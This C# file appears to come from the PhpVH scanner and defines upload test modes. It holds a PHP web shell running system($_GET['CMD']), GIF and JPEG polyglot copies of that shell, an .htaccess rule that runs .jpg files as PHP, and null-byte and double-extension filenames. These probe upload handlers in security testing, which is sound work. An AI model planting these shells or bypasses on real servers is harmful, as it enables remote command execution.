using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace PhpVH.ScanPlugins
{
    public class FileScanMode
    {
        private const string _phpShell = "<?php echo '<pre>' + system($_GET['CMD']) + '</pre>'; ?>";

        public static string _gifShell = "\x47\x49\x46\x38\x39\x61\xC2\x01\x73\x01\xF7\xFF\x00\x89\x94\x79\x59\x74\x64\x91\x9B\x84\x6D\x96\x8B\x39\x4C\x42\x87\xCA\xBD\xB4" + _phpShell;

        public static string _jpgShell = Jpeg.Image + _phpShell;

        public static string _htaccessShell = "AddType application/x-httpd-php .jpg\r\n\r\n" +
                "Action application/x-httpd-php \"/php/php.exe\"";

        private static string[] _shellFiles = new[]
        {
            //"<?php echo '<pre>' + system($_GET['CMD']) + '</pre>'; ?>",
            "\x47\x49\x46\x38\x39\x61\xC2\x01\x73\x01\xF7\xFF\x00\x89\x94\x79\x59\x74\x64\x91\x9B\x84\x6D\x96\x8B\x39\x4C\x42\x87\xCA\xBD\xB4" + _phpShell,
            Jpeg.Image + _phpShell,
            "AddType application/x-httpd-php .jpg\r\n\r\n" +
                "Action application/x-httpd-php \"/php/php.exe\"",

        };

        public static FileScanMode[] DefaultModes = new FileScanMode[]
        {
            new FileScanMode("shell.php", _phpShell, MimeTypes.TextPlain),
            new FileScanMode("shell.php", _phpShell, MimeTypes.TextXml),

            new FileScanMode("shell.php", _gifShell, MimeTypes.Gif),
            new FileScanMode("shell.php.gif", _gifShell, MimeTypes.Gif),
            new FileScanMode("shell.php\x00.gif", _gifShell, MimeTypes.Gif),            

            new FileScanMode("shell.php", _jpgShell, MimeTypes.Jpg),
            new FileScanMode("shell.php.jpg", _jpgShell, MimeTypes.Jpg),
            new FileScanMode("shell.php\x00.jpg", _jpgShell, MimeTypes.Jpg),

            new FileScanMode(".htaccess", _htaccessShell, MimeTypes.Jpg),
            new FileScanMode(".htaccess\x00.jpg", _htaccessShell, MimeTypes.Jpg),            
        };

        public string ShellFile { get; set; }

        public string Shell { get; set; }

        public string ContentType { get; set; }

        public FileScanMode(string ShellFile, string Shell, string ContentType)
        {
            this.Shell = Shell;
            this.ShellFile = ShellFile;
            this.ContentType = ContentType;
        }
    }
}
